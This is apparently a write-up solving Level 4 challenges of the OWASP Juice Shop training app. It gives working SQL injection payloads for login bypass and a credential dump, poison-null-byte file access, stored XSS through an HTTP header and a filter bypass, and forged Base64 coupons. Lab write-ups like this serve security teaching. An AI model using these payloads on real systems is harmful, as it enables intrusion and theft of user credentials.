# Level 4

## Christmas Special (Injection)
_Order the Christmas special offer of 2014._

You can find "Christmas special offer of 2014" in [application-configuration.json](misc/application-configuration.json).
By comparing with the list of products (`GET /api/Product`), you can determine that "Christmas special offer of 2014"
must have product ID `10`.

Knowing the ID, just add it to the cart:
```
POST /api/BasketItems/

{"ProductId":10,"BasketId":"1","quantity":1}
```

Finally, finish the order in your browser.

## Easter Egg (Broken Access Control)
_Find the hidden easter egg._

The egg is at `/ftp/eastere.gg`. However, it's protected by a file extension filter:
```
403 Error: Only .md and .pdf files are allowed!
```

The trick is exploiting [CWE-626: Null Byte Interaction Error (Poison Null Byte)](https://cwe.mitre.org/data/definitions/626.html)
> The poison null byte is frequently useful in path traversal attacks by terminating hard-coded extensions that are added to a filename.

Call `GET /ftp/eastere.gg%2500.md` (`%25` is URL encoded `%`):
```
"Congratulations, you found the easter egg!"
- The incredibly funny developers

...

...

...

Oh' wait, this isn't an easter egg at all! It's just a boring text file! The real easter egg can be found here:

L2d1ci9xcmlmL25lci9mYi9zaGFhbC9ndXJsL3V2cS9uYS9ybmZncmUvcnR0L2p2Z3V2YS9ndXIvcm5mZ3JlL3J0dA==

Good luck, egg hunter!
```

## Ephemeral Accountant (Injection)
_Log in with the (non-existing) accountant acc0unt4nt@juice-sh.op without ever registering that user._

This is about SQL injection into _Login form_. If you already done the [Database Schema](level3.md#database-schema-injection)
challenge, you know the number of columns and data types of `users` table.
 
```
xxx' UNION SELECT 999, '', 'acc0unt4nt@juice-sh.op', 'password', 'accounting', '', '0.0.0.0', '/assets/public/images/uploads/default.svg', '', 1, '2020-08-15T18:22:49.161Z', '2020-08-15T18:22:49.161Z', null; --
```

The role must be the `accounting`!

## Expired Coupon (Improper Input Validation)
_Successfully redeem an expired campaign coupon code._

The first step is to take a look how coupons work. You can always get a valid coupon on
[Juice shop Twitter](https://twitter.com/owasp_juiceshop).

There's a [coupon for 09/2020](https://twitter.com/owasp_juiceshop/status/1301392070532308992):
```
q:<IrfFb4l
```

Log in, add some items into the basket and make an order using the coupon. The important request is:
```
POST /rest/basket/1/checkout

{"couponData":"cTo8SXJmRmI0bC0xNjAxMTYxMjAwMDAw","orderDetails":{"paymentId":"4","addressId":"3","deliveryMethodId":"1"}}
```

Decode `couponData` (Base64):
```
q:<IrfFb4l-1601161200000
```

There's the coupon code (`q:<IrfFb4l`), and today's timestamp (`1601161200000`).

Now let's look for some expired coupons.
 
At first, I was looking for an older coupon on Twitter but that does not work!
The challenge description states: "redeem an expired **campaign** coupon code".

Searching for `campaign` in source code points to:
```
WMNSDY2019: {
    validOn: 15519996e5,
    discount: 75
},
WMNSDY2020: {validOn: 1583622e6, discount: 60},
WMNSDY2021: {validOn: 1615158e6, discount: 60},
WMNSDY2022: {validOn: 1646694e6, discount: 60},
WMNSDY2023: {validOn: 167823e7, discount: 60},
ORANGE2020: {validOn: 15885468e5, discount: 50},
ORANGE2021: {validOn: 16200828e5, discount: 40},
ORANGE2022: {validOn: 16516188e5, discount: 40},
ORANGE2023: {validOn: 16831548e5, discount: 40}
```

There's `WMNSDY2019` with valid on `15519996e5` --> `1551999600000` -> `Thursday 7. March 2019 23:00:00`.

Ok, let's try to use it in `couponData`. Encode `WMNSDY2019-1551999600000` with Base64:
```
V01OU0RZMjAxOS0xNTUxOTk5NjAwMDAw
```

Intercept the checkout request and modify the coupon data with `V01OU0RZMjAxOS0xNTUxOTk5NjAwMDAw`.

Bingo, the discount is yours!

## Forgotten Developer Backup (Sensitive Data Exposure)
_Access a developer's forgotten backup file._

The same trick as in the [Easter Egg](#easter-egg-broken-access-control) challenge.

Call `GET /ftp/coupons_2013.md.bak%2500.md` and obtain [package.json.bak](misc/package.json.bak).

## Forgotten Sales Backup (Sensitive Data Exposure)
_Access a salesman's forgotten backup file._

The same trick as in the [Easter Egg](#easter-egg-broken-access-control) challenge.

Call `GET /ftp/coupons_2013.md.bak%2500.md`
```
n<MibgC7sn
mNYS#gC7sn
o*IVigC7sn
k#pDlgC7sn
o*I]pgC7sn
n(XRvgC7sn
n(XLtgC7sn
k#*AfgC7sn
q:<IqgC7sn
pEw8ogC7sn
pes[BgC7sn
l}6D$gC7ss
```

## HTTP-Header XSS (XSS)
_Perform a persisted XSS attack with <iframe src="javascript:alert(`xss`)"> through an HTTP header._

The first step is to find a place where an HTTP header is reflected back to the user.

I was suspicious from the beginning about the _Last Login IP_ page (`/#/privacy-security/last-login-ip`). The IP address
is usually taken from HTTP header [X-Forwarded-For](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For).

Next step is to understand how this last login IP is set.
 
Grepping through [main-es2015.js](misc/main-es2015.js):
```
grep 'rest/' misc/main-es2015.js
```

One of the results points to:
```
saveLastLoginIp() {
    return this.http.get(this.hostServer + "/rest/saveLoginIp").pipe(Object(s.a)(t => t), Object(l.a)(t => {
        throw t
    }))
}
```

This method is called during `logout`.

Log in, log out and let's try to manipulate the HTTP headers.

First attempt is obvious:
```
X-Forwarded-For: 1.1.1.1
```

No luck! 

Don't despair, there are more ways how to [spoof an IP address](https://portswigger.net/kb/issues/00400110_spoofable-client-ip-address).

`True-Client-IP` is the correct one. Just add this header to `GET /rest/saveLoginIp` request:
```
True-Client-IP: <iframe src="javascript:alert(`xss`)">
```

If you really want to trigger the XSS (not necessary to solve the challenge):
1. Log in
2. Log out (triggers `GET /rest/saveLoginIp`)
3. Replay `GET /rest/saveLoginIp` with the extra header
4. Log in and go to _Last Login IP_ page

## Leaked Unsafe Product (Sensitive Data Exposure)
_Identify an unsafe product that was removed from the shop and inform the shop which ingredients are dangerous._

Similar to the challenge [Christmas Special](#christmas-special-injection), we can easily identify the product in 
[application-configuration.json](misc/application-configuration.json):
```json
{
    "name": "Rippertuer Special Juice",
    "description": "Contains a magical collection of the rarest fruits gathered from all around the world, like Cherymoya Annona cherimola, Jabuticaba Myrciaria cauliflora, Bael Aegle marmelos... and others, at an unbelievable price! <br/><span style=\"color:red;\">This item has been made unavailable because of lack of safety standards.</span>",
    "price": 16.99,
    "image": "undefined.jpg",
    "keywordsForPastebinDataLeakChallenge": [
      "hueteroneel",
      "eurogium edule"
    ]
}
```

Googling for the rarest fruits is not the solution, they are all safe.
So either google for `Rippertuer Special Juice` and find this paste https://pastebin.com/90dUgd7s
or get the answer from `keywordsForPastebinDataLeakChallenge` (guess this is not intentional though).

Submit `Hueteroneel and Eurogium Edule` into _Customer Feedback_ form.

## Nested Easter Egg (Cryptographic Issues)
_Apply some advanced cryptanalysis to find the real easter egg._

This challenge follows [Easter Egg](#easter-egg-broken-access-control). The goal is to decrypt:
```
L2d1ci9xcmlmL25lci9mYi9zaGFhbC9ndXJsL3V2cS9uYS9ybmZncmUvcnR0L2p2Z3V2YS9ndXIvcm5mZ3JlL3J0dA==
```

This is rather easy.
 
1) Decode `Base64` (https://www.base64decode.org/):
```
/gur/qrif/ner/fb/shaal/gurl/uvq/na/rnfgre/rtt/jvguva/gur/rnfgre/rtt
```

2) Apply [ROT13](https://en.wikipedia.org/wiki/ROT13) cipher (https://rot13.com/):
```
/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg
```

Call `GET /the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg`

## Reset Bender's Password (Broken Authentication)
_Reset Bender's password via the Forgot Password mechanism with the original answer to his security question._

Bender's security question is:
> Company you first work for as an adult?

[Bender](https://en.wikipedia.org/wiki/Bender_(Futurama)) is a well-known character from the
TV show [Futurama](https://en.wikipedia.org/wiki/Futurama).

The [wiki](https://en.wikipedia.org/wiki/Bender_(Futurama)) lists his occupations as:
- Suicide booth construction worker (formerly)
- Planet Express Bender / Chef

Read more about [suicide booths](https://futurama.fandom.com/wiki/Suicide_Booth):
> Suicide booths were invented somewhere between 2006 and 2008. Since 2008, America's most important brand of suicide booths is Stop'n'Drop. 

The correct answer is `Stop'n'Drop`

## Reset Uvogin's Password (Sensitive Data Exposure)
_Reset Uvogin's password via the Forgot Password mechanism with the original answer to his security question._

Uvogin's security question is:
> Your favorite movie?

This one is rather hard so let's start with some hints:
> People often reuse aliases online. You might be able to find something by looking online for Uvogin's name or slight variations of it based on his unique writing habits

"Unique writing habits" points to [leetspeak](https://en.wikipedia.org/wiki/Leet).
See that all comments from `Uvogin` are like `y0ur f1r3wall needs m0r3 musc13` or `0 st4rs f0r 7h3 h0rr1bl3 s3cur17y`.

Googling for `uv0gin` quickly reveals his [Twitter account](https://twitter.com/uv0gin).
Unfortunately, nothing useful is here.

The catch is that the important tweet was deleted (_I had no idea and had to look into solutions_).
However, you can recover it with a service such as [Wayback Machine](https://web.archive.org/web/20200403193744/https://twitter.com/uv0gin):

![](images/uv0gin-movie.png)

The correct answer is `Silence of the Lambs`

## Server-side XSS Protection (XSS)
_Perform a persisted XSS attack with <iframe src="javascript:alert(`xss`)"> bypassing a server-side security mechanism._

I tried to use this payload in the _Customer Feedback_ form, but the payload was deleted:
```
Hello <iframe src="javascript:alert(`xss`)">
```

Resulting into:
```
Hello
```

Hopefully, it's just a simple string replacement. So let's try:
```
<<iframe src="javascript:alert(`xss`)">iframe src="javascript:alert(`xss`)">
```

Bingo, the nested ```<iframe src="javascript:alert(`xss`)">``` string is deleted resulting into the original payload!

## User Credentials (Injection)
_Retrieve a list of all user credentials via SQL Injection._

This challenge follows the [Database Schema](level3.md#database-schema-injection) challenge:
```
GET /rest/products/search?q=Apple'))+UNION+SELECT+username,email,password,role,deluxeToken,lastLoginIp,profileImage,totpSecret,isActive+FROM+Users--
```

The result is in [misc/users.json](misc/users.json).